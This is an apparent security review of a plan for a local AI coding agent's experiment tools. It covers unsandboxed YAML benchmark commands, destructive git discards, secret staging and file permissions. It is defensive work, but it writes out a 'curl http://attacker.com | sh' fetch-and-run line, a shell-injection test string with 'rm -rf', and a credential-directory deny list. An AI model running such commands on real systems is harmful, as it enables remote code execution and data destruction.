---
artifact_type: safety-review
reviewer: flux-drive-safety
plan: docs/plans/2026-03-15-autoresearch-skaffen.md
date: 2026-03-15
risk_classification: Medium
---

# Safety Review: Autoresearch Skaffen Plan

## Threat Model Classification

**Deployment context:** Local developer tool. Skaffen runs as the invoking user on a single machine. No network-facing surface. No multi-tenant boundary.

**Untrusted inputs:** YAML campaign files loaded from `.skaffen/campaigns/` and `~/.skaffen/campaigns/`. These are user-authored — the user controls them — but a malicious project directory (e.g., a cloned repo containing a crafted `.skaffen/campaigns/` file) could be trusted by mistake.

**Credentials:** The existing `DenyDirs` list in `DefaultPolicy` covers `~/.ssh`, `~/.gnupg`, `~/.aws`, `~/.config/gh`, and `~/.netrc`. These protections are in place today.

**Deployment path:** Compiled Go binary invoked by the developer. No CI/CD automation involved. No privilege escalation.

**Change risk rating: Medium.** The plan introduces shell command execution from YAML config, git worktree state mutations, and persistent JSONL files — none individually catastrophic, but the combination creates a new attack surface (arbitrary command execution from a file the sandbox does not police) and two distinct irreversible operations (`DiscardChanges`, `git add -A` staging).

---

## Findings

### Finding 1 — CRITICAL (exploitable): RunExperimentTool executes YAML-sourced benchmark commands outside the sandbox

**Location:** Plan Task 5, `os/Skaffen/internal/tool/experiment/run.go` (planned)

The plan specifies: "Run benchmark command (from campaign YAML) in worktree directory with timeout." The command string comes directly from the user-authored YAML. The `BashTool` in `internal/tool/bash.go` routes through `sandbox.WrapArgs` when a `Sandbox` is configured, but `RunExperimentTool` is a new tool that will shell out via `exec.Command` internally, bypassing the registry's sandbox path entirely.

Concretely: the registry's `Execute()` method (line 257 in `registry.go`) only applies sandbox path-checking for `read`, `write`, `edit`, `grep`, `glob` tools. The `bash` tool gets `WrapArgs` applied at the `BashTool.Execute()` call site. The new `run_experiment` tool has no equivalent — it will call `exec.Command` on the campaign's `benchmark.command` string with no bwrap wrapping.

Even under the user-as-author trust model, a cloned project with a `.skaffen/campaigns/malicious.yaml` containing `command: "curl http://attacker.com | sh"` executes without any confirmation when the agent calls `run_experiment` — and because the tool is restricted to `PhaseAct`, it does so at the moment the agent is actively modifying the codebase.

**Impact:** Arbitrary shell command execution as the user.

**Likelihood:** Moderate. Requires either a malicious project directory or a confused-deputy scenario where the agent is directed at an untrusted campaign file.

**Mitigations required before implementation:**

1. Pass the `*sandbox.Sandbox` into `RunExperimentTool` and call `s.WrapArgs("bash", "-c", command)` before `exec.Command`, exactly as `BashTool` does. This gives bwrap containment when bwrap is available.
2. Add a `RequirePrompt: true` gate constraint on `run_experiment` in `RegisterExperimentTools`, so the trust evaluator surfaces the benchmark command string to the user before first execution in a new campaign. Subsequent runs of the same campaign+command can be auto-approved. This is the analogue of the `Reflect`-phase edit constraint (`RequirePrompt: true`).
3. The campaign YAML validator (`LoadCampaign`) should reject commands containing shell metacharacters that suggest injection (pipes, backticks, `$(`, `&&`, `||`) and require the user to explicitly allow them via a `benchmark.allow_shell: true` flag. This adds friction proportionate to the risk.

The `RequirePrompt` fix is the minimum viable gate. The bwrap wrapping is the defense-in-depth layer. Both should ship together.

---

### Finding 2 — HIGH (irreversible data risk): DiscardChanges has no confirmation gate and operates on the entire worktree

**Location:** Plan Task 3, `GitOps.DiscardChanges()` (planned), called from Task 6 `LogExperimentTool`

The plan calls `git checkout -- .` in the worktree directory. This is fully destructive and non-recoverable for uncommitted changes. The plan notes "worktree isolation mitigates this" — but the mitigation is incomplete.

The real risk is agent confusion about campaign identity. If two campaigns are active simultaneously (the plan allows `HasWorktree` reuse), or if the worktree path is computed incorrectly, `DiscardChanges()` operates on the wrong directory. The path `/tmp/autoresearch-{name}` is computed from the campaign name alone — if the agent passes a mismatched campaign name, discarding the wrong set of changes is silent and permanent.

A secondary risk: the plan's `LogExperimentTool` auto-forces `decision = "discard"` when a secondary metric regression is detected (Task 6, Step 3). This means the discard can be triggered without an explicit agent decision — it's a code path, not a prompt response. If the secondary metric threshold or regex is wrong, valid work is silently discarded.

**Impact:** Silent, permanent loss of uncommitted experiment work.

**Mitigations required:**

1. Before calling `git checkout -- .`, call `git diff --stat HEAD` and include the file list in a confirmation prompt routed through the trust evaluator (`RequirePrompt: true` on `log_experiment` when `decision = "discard"`). This is consistent with the existing pattern for destructive edits in Reflect phase.
2. The auto-discard on secondary regression should log the reason and return it in the tool result so the agent can review before the next experiment, but should not silently execute the discard. Change the logic to return `"discard_recommended"` (not execute) when forced by regression detection, and let the agent confirm.
3. The `GitOps` struct should verify the worktree path matches an expected SHA at construction time so stale or mismatched worktrees surface immediately.

---

### Finding 3 — HIGH (sensitive file staging): git add -A in worktrees containing user files

**Location:** Plan Task 3, `GitOps.KeepChanges()`, and existing `git.AutoCommit()` in `os/Skaffen/internal/git/git.go:36`

The plan's `KeepChanges` will run `git add -A` inside the worktree at `/tmp/autoresearch-{name}`. This is the same pattern as the existing `AutoCommit` method.

The concern is specifically what lands in the worktree. Worktrees created by `git worktree add` inherit the parent repo's `.gitignore`. The Skaffen `.gitignore` at `os/Skaffen/.gitignore` excludes `.skaffen/`, `.env` is not explicitly listed. If the benchmark command creates a `.env` or secret file in the worktree (e.g., a test fixture that writes credentials to disk), `git add -A` stages it.

The existing `AutoCommit` carries this same risk for the main working tree. In the worktree context the risk is higher because: (a) the benchmark command is arbitrary, (b) the worktree is under `/tmp` which is outside the normal user-monitored area.

**Impact:** Credential or secret file committed to git history. Recovery requires `git filter-repo` and force-push to all remotes.

**Mitigations:**

1. Add `.env`, `*.env`, `*.pem`, `*.key`, `*_rsa`, `*.p12` to the Skaffen `.gitignore` at `os/Skaffen/.gitignore`. This protects both `AutoCommit` and the new `KeepChanges`.
2. In `KeepChanges`, after `git add -A` and before `git commit`, run `git diff --cached --name-only` and fail the commit if any staged filename matches a secret-file pattern. Return the list of suspicious files to the agent as an error. This is a belt-and-suspenders check that survives `.gitignore` misconfiguration.
3. Document explicitly in the `SKILL.md` that benchmark commands must not write credentials to the worktree filesystem.

---

### Finding 4 — MEDIUM (predictable tmp path): /tmp/autoresearch-{name} is world-readable and predictable

**Location:** Plan Task 3, `GitOps.CreateWorktree()` (planned)

`/tmp/autoresearch-{name}` is predictable (campaign name is known from YAML, visible to all users on the system) and world-readable by default. On a shared development machine (e.g., ethics-gradient, which this repo syncs to), other users can read experiment code including any intermediate state.

The `/tmp` path is also in `DefaultPolicy.WriteDirs` (from `policy.go:44`), meaning the sandbox allows writes there — but that means the benchmark command can also write to `/tmp` freely, which is intentional but worth noting.

**Impact:** Experiment code (potentially proprietary algorithms being optimized) visible to other local users.

**Mitigation:**

Change `CreateWorktree` to use `~/.skaffen/worktrees/{name}` as the default path. This is outside `/tmp`, user-owned (0700 parent directory), and consistent with the existing `~/.skaffen/` convention used for experiments and evidence. The sandbox `WriteDirs` already includes the user home subtree implicitly via `ReadDirs`. If `/tmp` isolation is desired for crash cleanup, use `os.MkdirTemp("", "autoresearch-")` and record the resulting path in the segment JSONL so resume can find it.

As a secondary issue: if `~/.skaffen/worktrees/` is used, add it to `DenyDirs` extension points in `DefaultPolicy` for any future multi-user Skaffen deployment, since experiment code should not be network-readable.

---

### Finding 5 — MEDIUM (file permissions): JSONL experiment files created at 0644

**Location:** Plan Task 2, `store.go`; existing `emitter.go:60` uses 0644

The plan inherits the pattern from `evidence/emitter.go` which creates JSONL files with `os.OpenFile(..., 0644)`. The experiment JSONL will contain hypothesis text, benchmark output (which may include code snippets, error messages with paths, or partial outputs of proprietary algorithms), and metric values.

0644 makes these files world-readable on any system where the home directory is accessible to other users. On a shared machine or where `~/.skaffen/` is mounted or snapshotted, this is an information leak.

**Impact:** Experiment contents (code snippets, benchmark output, hypotheses) readable by other local users.

**Mitigation:**

Change the `os.OpenFile` call in `Store.Segment.LogExperiment` to use permission `0600`. Similarly, the `MkdirAll` call for the experiments directory should use `0700` rather than `0755`. This matches the standard for user-private data directories.

The same fix should be applied to the existing `evidence/emitter.go` — this review surface reveals the `appendJSONL` function uses `0644` for evidence JSONL and `0755` for its directory. Both should be tightened. This is not gated on the autoresearch plan but is a latent issue the plan amplifies.

---

### Finding 6 — MEDIUM (sandbox gap): Experiment tools execute in worktree, sandbox policy doesn't cover /tmp

**Location:** `os/Skaffen/internal/sandbox/policy.go:41-55`, Plan Task 7

The existing `DefaultPolicy` includes `/tmp` in `WriteDirs`. This means the sandbox (when bwrap is active) does bind-mount `/tmp` as read-write. So the worktree at `/tmp/autoresearch-{name}` is accessible to sandboxed commands — this is actually correct for the current `/tmp`-based worktree location.

However, if Finding 4's mitigation is applied and worktrees move to `~/.skaffen/worktrees/`, that path must be explicitly added to the sandbox `WriteDirs` for bwrap to bind-mount it. The `DefaultPolicy` only includes `workDir` and `/tmp` in `WriteDirs`; `~/.skaffen/` is not in `WriteDirs`, only transitively reachable via the `home` ReadDir entry — meaning the bwrap sandbox would mount it read-only, and `git add -A` inside bwrap would fail.

**Required action:** If worktrees move to `~/.skaffen/worktrees/`, add that path to `DefaultPolicy.WriteDirs`, or accept that benchmark commands run outside bwrap (degraded sandbox mode) for worktree operations.

---

### Finding 7 — LOW (interlab bridge injection): ic events record --payload= passes JSON as a CLI flag

**Location:** Plan Task 6, Step 3: `ic events record --source=autoresearch --type=mutation_kept --payload='{...}'`

The existing `evidence/emitter.go` uses the same pattern (line 107-115) and passes JSON as `--payload=<string>`. The hypothesis string from the agent comes from user input and is included in the payload JSON. If the hypothesis contains shell metacharacters (quotes, `$()`, backticks), and this is assembled via string interpolation rather than `exec.Command` with a proper args slice, it becomes a command injection vector.

**Assessment:** The existing `BridgeArgs()` method builds the args slice correctly using Go's `exec.Command` — the payload is passed as a single slice element, not through a shell. The same pattern must be followed in the autoresearch interlab bridge. If `LogExperimentTool` assembles the `ic` invocation via a shell string (e.g., `bash -c "ic events record ... --payload='"+hypothesis+"'"`) rather than via `exec.Command` with an args slice, this is exploitable.

**Mitigation:** Explicitly require that the interlab bridge in `LogExperimentTool` uses the same `exec.Command(e.icPath, args...)` pattern as `bridgeToIntercore`, not a shell invocation. Flag this in code review. Add a test with a hypothesis string containing `'; rm -rf /tmp/test'` and verify no shell execution occurs.

---

## Deployment Safety Assessment

### Pre-deploy invariants

Before merging the implementation:

- `go vet ./internal/tool/experiment/` exits 0
- `go test ./internal/tool/experiment/ -count=1` exits 0
- `go test ./internal/sandbox/ -count=1` exits 0 (no regressions to bwrap wrapping)
- Manually verify that a campaign YAML with `command: "touch /tmp/autoresearch-pwned"` does not create that file when the sandbox is enabled (bwrap must wrap the benchmark execution)

### Rollback feasibility

- Rollback of the Go binary: full rollback — recompile without the experiment package. The registry change in `builtin.go` is additive; removing it is clean.
- Rollback of JSONL data: JSONL files are append-only, not migrated. Removing `~/.skaffen/experiments/` is a clean teardown with no downstream effects.
- Rollback of worktrees: `git worktree list` shows active worktrees; `git worktree remove --force <path>` cleans them. The autoresearch branches (`autoresearch/{name}`) can be deleted with `git branch -D`.
- **Irreversible operations:** `DiscardChanges` (data loss, not code), committed keep-changes (reversible via `git revert` on the autoresearch branch, which is isolated from main). No schema migrations involved. Overall rollback posture is good — worktrees are self-contained and the main branch is not touched.

### Post-deploy verification

After first deployment:

1. Run `skaffen` with a trivial campaign YAML whose `benchmark.command` is `echo "METRIC value=42"` and verify the full init/run/log loop completes.
2. Check `ls -la ~/.skaffen/experiments/` — files should be mode 0600 (this will catch the permissions fix).
3. Run `git worktree list` in the project repo and verify the autoresearch worktree appears and is removed after the campaign ends.
4. With bwrap enabled, verify the benchmark command cannot write outside the worktree: use `command: "touch /etc/autoresearch-test"` and confirm it fails.

---

## Go/No-Go Decision

**No-go on current plan as written.** Two blockers:

1. Finding 1 (CRITICAL): `RunExperimentTool` must wrap the benchmark command through the sandbox (`WrapArgs`) and add `RequirePrompt: true` before this ships. An arbitrary shell command executing outside the sandbox in PhaseAct is not acceptable even for a developer-local tool, because the campaign YAML trust boundary is not enforced.

2. Finding 2 (HIGH): `DiscardChanges` must be gated behind a trust-evaluator prompt showing the affected file list. The auto-discard path triggered by secondary metric regression must return a recommendation, not execute silently.

Findings 3-7 are required before stable release but do not block the initial implementation from landing if Findings 1 and 2 are resolved first.

---

## Summary Table

| # | Finding | Severity | Blocks ship? | Mitigation |
|---|---------|----------|--------------|-----------|
| 1 | RunExperimentTool executes YAML commands outside sandbox | Critical | Yes | WrapArgs + RequirePrompt on run_experiment |
| 2 | DiscardChanges irreversible without confirmation | High | Yes | RequirePrompt on discard; recommendation-only for auto-discard |
| 3 | git add -A can stage .env/secret files in worktree | High | No (pre-stable) | Add secret patterns to .gitignore + staged-file check in KeepChanges |
| 4 | /tmp worktree path is predictable and world-readable | Medium | No | Use ~/.skaffen/worktrees/ or os.MkdirTemp with stored path |
| 5 | JSONL files created at 0644 (world-readable) | Medium | No | Use 0600 for files, 0700 for dirs; fix evidence/emitter.go too |
| 6 | Sandbox WriteDirs gap if worktrees move to ~/.skaffen | Medium | No (conditional on fix 4) | Add ~/.skaffen/worktrees/ to DefaultPolicy.WriteDirs |
| 7 | ic events bridge must use exec.Command args slice | Low | No | Code review gate + test with injection string |
